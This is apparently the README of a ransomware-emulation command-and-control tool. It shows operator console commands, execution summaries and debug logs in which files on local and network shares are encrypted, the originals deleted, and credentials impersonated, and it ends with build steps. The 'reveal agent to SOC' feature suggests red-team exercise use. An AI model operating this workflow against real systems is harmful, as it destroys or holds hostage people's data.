# Base

## Protocol
- 2-way Command JSON
- HTTP/HTTPs for now
- Agent pub sub.
- Agent jitter
- Hot reloading of connectivity endpoints

## Operation

```
$ runbase
```

List checked in agents:
- Active : accepted for interaction
- Pending: not yet accepted for interaction

```
no agent: > activate
Agent (active):

Agents (pending):
2e1bb2f0-c20a-4eb6-baa4-18832af621c2 2021-02-21 12:02:55.9616266 -0600 CST
```

Activate agent content
```
no agent: > activate 2e1bb2f0-c20a-4eb6-baa4-18832af621c2
```

Get agent info 
```
no agent:activate 2e1bb2f0-c20a-4eb6-baa4-18832af621c2 > heartbeat
[2e1bb2f0-c20a-4eb6-baa4-18832af621c2]
        Host: 555-LT-X0874 / 555-LT-X0874, PID: 25216 (A:false), User: NA\user01
```

Set agent log verbosity
```
2e1bb2f0-c20a-4eb6-baa4-18832af621c2: > logs set debug
```

Set policy masterkey
```
2e1bb2f0-c20a-4eb6-baa4-18832af621c2: > masterkey
? Please type your masterkey [? for help] *******
masterkey:  *******
? OK to send? Yes
2e1bb2f0-c20a-4eb6-baa4-18832af621c2:masterkey > 
```

Policy load and run
```
2e1bb2f0-c20a-4eb6-baa4-18832af621c2: > polexec
? Choose source of payload: file                                 
? file to get payload from: C:\Users\user01\source\repos\FileConnector\configs\policy-full.json
Processing paylaod from file: C:\Users\user01\source\repos\FileConnector\configs\policy-full.json
2e1bb2f0-c20a-4eb6-baa4-18832af621c2:polexec > 
```

Get run summary 
```txt
2e1bb2f0-c20a-4eb6-baa4-18832af621c2: > summary
[2e1bb2f0-c20a-4eb6-baa4-18832af621c2]
Execution Report for Site ID 2e1bb2f0-c20a-4eb6-baa4-18832af621c2
{
  "SiteId": "2e1bb2f0-c20a-4eb6-baa4-18832af621c2",
  "HostTaskSummaries": [
    {
      "HostIdent": "HostA",
      "FileTaskSummaries": [
        {
          "PreImageName": "\\Users\\user01\\Downloads\\Share\\file5.log",
          "PostImageName": "\\Users\\user01\\Downloads\\Share\\file5.log.enc",
          "PreImageHash": "B3DAC8BC11506D42D4DFE89B7F73B988D0C754301F0CF5F301DF6B62A7CFC2FD",
          "PostImageHash": "BA0D750160BB0ED0136BC1F5E35B3083ABB1B2107560580325F76C43141F925F",
          "PreImageSize": 1002,
          "PostImageSize": 1040,
          "ImageTime": "2/21/2021 12:06:11 PM",
          "SymKey": null,
          "Operation": 1
        },
        {
          "PreImageName": "X:\\file6.log",
          "PostImageName": null,
          "PreImageHash": "",
          "PostImageHash": null,
          "PreImageSize": 0,
          "PostImageSize": 0,
          "ImageTime": null,
          "SymKey": null,
          "Operation": 1
        }
      ]
    },
    {
      "HostIdent": "HostB",
      "FileTaskSummaries": [
        {
          "PreImageName": "\\\\555-LT-X0874\\Share\\file1.log",
          "PostImageName": "\\\\555-LT-X0874\\Share\\file1.log.enc",
          "PreImageHash": "B3DAC8BC11506D42D4DFE89B7F73B988D0C754301F0CF5F301DF6B62A7CFC2FD",
          "PostImageHash": "EA5977B74BDA7AC327458618807BAFF3F2CA605BCC7EAA1303F7175E645104FC",
          "PreImageSize": 1002,
          "PostImageSize": 1040,
          "ImageTime": "2/21/2021 12:06:12 PM",
          "SymKey": null,
          "Operation": 1
        },
        {
          "PreImageName": "\\\\555-LT-X0874\\Share\\file2.log",
          "PostImageName": "\\\\555-LT-X0874\\Share\\file2.log.enc",
          "PreImageHash": "B3DAC8BC11506D42D4DFE89B7F73B988D0C754301F0CF5F301DF6B62A7CFC2FD",
          "PostImageHash": "CFAAD8CD63AD995A9647053F3C5211A90C39DE55DD405937813F745A4DA0C3A2",
          "PreImageSize": 1002,
          "PostImageSize": 1040,
          "ImageTime": "2/21/2021 12:06:13 PM",
          "SymKey": null,
          "Operation": 1
        },
        {
          "PreImageName": "\\\\555-LT-X0874\\Share\\file4.log",
          "PostImageName": "\\\\555-LT-X0874\\Share\\file4.log.enc",
          "PreImageHash": "B3DAC8BC11506D42D4DFE89B7F73B988D0C754301F0CF5F301DF6B62A7CFC2FD",
          "PostImageHash": "20FCE8E8F624DECB7592487EEEA9D238D9E314A28E99E6B560ED568445D776C2",
          "PreImageSize": 1002,
          "PostImageSize": 1040,
          "ImageTime": "2/21/2021 12:06:14 PM",
          "SymKey": null,
          "Operation": 1
        }
      ]
    }
  ]
}
```

Get Logs 
```
2e1bb2f0-c20a-4eb6-baa4-18832af621c2: > logs get
Getting logs ...

2021.02.21 12:06:10.684 Debug   Loading config from network
2021.02.21 12:06:10.684 Debug   Deserializing config
2021.02.21 12:06:10.693 Debug   Config tree populated
2021.02.21 12:06:10.695 Debug   Loading configuration tree
2021.02.21 12:06:10.695 Debug   MasterKey: $RNS$V1$10000$8LIbLgrCtk66pBiDKvYhwpFwvzpYKz6jWaUGh9kV89jIJwOL, SiteID: 2e1bb2f0-c20a-4eb6-baa4-18832af621c2
2021.02.21 12:06:10.695 Debug   Mapping hosts to authentication
2021.02.21 12:06:10.743 Debug   MasterKeyHash: $RNS$V1$10000$8LIbLgrCtk66pBiDKvYhwpFwvzpYKz6jWaUGh9kV89jIJwOL
2021.02.21 12:06:10.743 Debug   Iterating over hosts
2021.02.21 12:06:10.743 Debug
 [[ Entering host : HostA (555-LT-X0874) ]]
2021.02.21 12:06:10.743 Debug   Auth: Local
2021.02.21 12:06:10.743 Debug   Building local user impersonation NetworkCredential
2021.02.21 12:06:10.743 Debug   Iterating over files in host
2021.02.21 12:06:10.753 Debug   Encrypting \Users\user01\Downloads\Share\file5.log => \Users\user01\Downloads\Share\file5.log.enc key: 9993c359-c58a-4c11-8cd0-f4c4695be28f
2021.02.21 12:06:10.754 Debug   Encrypting file \Users\user01\Downloads\Share\file5.log -> \Users\user01\Downloads\Share\file5.log.enc
2021.02.21 12:06:10.754 Debug   File \Users\user01\Downloads\Share\file5.log found
2021.02.21 12:06:11.705 Error   File X:\file6.log not found
2021.02.21 12:06:11.705 Debug   Unable to properly encrypt file: X:\file6.log
2021.02.21 12:06:11.705 Debug
 [[ Entering host : HostB (555-LT-X0874) ]]
2021.02.21 12:06:12.239 Debug   Derived Key: 0D-BE-C1-99-9E-D9-45-D4-BB-C9-4C-D4-83-2E-50-8A-C8-3A-9B-E3-D8-A7-BD-C9-56-66-8A-93-87-67-71-64
2021.02.21 12:06:12.688 Debug   Wrote salt 32-0D-E6-F0-6F-EA-E1-76-FA-1C-1C-E8-96-E8-49-89-7B-B4-06-AF-4C-85-D1-51-49-E5-C8-86-91-E6-C3-DA of size: 32
2021.02.21 12:06:12.702 Debug   Flushed final block
2021.02.21 12:06:12.709 Debug   Encryption routine success
2021.02.21 12:06:12.709 Debug   Deleting original file \\555-LT-X0874\Share\file1.log
2021.02.21 12:06:12.718 Debug   Encrypting \\555-LT-X0874\Share\file2.log => \\555-LT-X0874\Share\file2.log.enc key: 6fd3c359-c58a-4c11-8cd0-f4c4695be28f
2021.02.21 12:06:14.613 Debug   Built networkPath as \\555-LT-X0874
2021.02.21 12:06:15.095 Debug   Decrypted credentials
2021.02.21 12:06:15.096 Debug   Building supplied user impersonation NetworkCredential
2021.02.21 12:06:15.096 Info    Connecting to \\555-LT-X0874
2021.02.21 12:06:15.105 Error   Win32Exception: (0): Cannot connect to System.ComponentModel.Win32Exception (0x80004005): Error connecting to remote share
   at FileConnector.ConnectToSharedFolder..ctor(String networkName, NetworkCredential credentials) in C:\Users\user01\source\repos\FileConnector\FileConnector\Driver.cs:line 67
   at FileConnector.ServerTasks.Impl.TaskRunPolicy.Run() in C:\Users\user01\source\repos\FileConnector\FileConnector\ServerTasks\TaskImpl\TaskRunPolicy.cs:line 142:
2021.02.21 12:06:15.106 Debug   Sleeping for 5000
2021.02.21 12:06:30.182 Debug   => Resource /summary , method: Post
2021.02.21 12:06:30.183 Debug   Sleeping for 5000
```

Reveal agent to SOC
```
2e1bb2f0-c20a-4eb6-baa4-18832af621c2: > agent self unhide console
Unhiding console ...
2e1bb2f0-c20a-4eb6-baa4-18832af621c2:agent self unhide console > 
2e1bb2f0-c20a-4eb6-baa4-18832af621c2: > 
2e1bb2f0-c20a-4eb6-baa4-18832af621c2: > agent self unhide message
Unhiding message ...
2e1bb2f0-c20a-4eb6-baa4-18832af621c2:agent self unhide message > 
2e1bb2f0-c20a-4eb6-baa4-18832af621c2: > 
```
Terminate remote agent 
```txt
2e1bb2f0-c20a-4eb6-baa4-18832af621c2:agent self unhide message > agent self terminate
? Sure terminate agent? This is irreversible. Yes
```

## Examples (Runtime)
- [Agent running](../images/agent-running.png)
- [Agent clear memory logs](../images/agent-clear-remote-memory-0buffer-logs.png)
- [Agent send policy summary](../images/agent-sent-policy-output.png)
- [Agent set masterkey on policy](../images/agent-set-masterkey.png)
- [Agent self termination](../images/agent-terminated.png)
- [Agent reveals presence after encryption](../images/agent-unhide-message.png)
- [Agent up verbosity level](../images/agent-up-verbosity-memory.png)
- [Asset encryption](../images/asset-encrypted.png)
- [Agent embedded policy - lights out](../images/embed-policy.png)
- [Operator help system](../images/predictive-command-help.png)

# Dev/Build
Prerequisites:
- Reasonably latest Golang dist (16+)
- You should have `export GOROOT` pointing to GO SDK (e.g. `/usr/local/go-17.1/`).
- You should have `export GOPATH` pointing to where your Go workspace (e.g. `/User/dev/go`)

Compile code:
1. Clone the repo: `got clone <this repo path>`
2. Navigate to the server component: `cd racketeer/server`
3. Build the code: `GO111MODULE=on go build -o bin/server.exe`

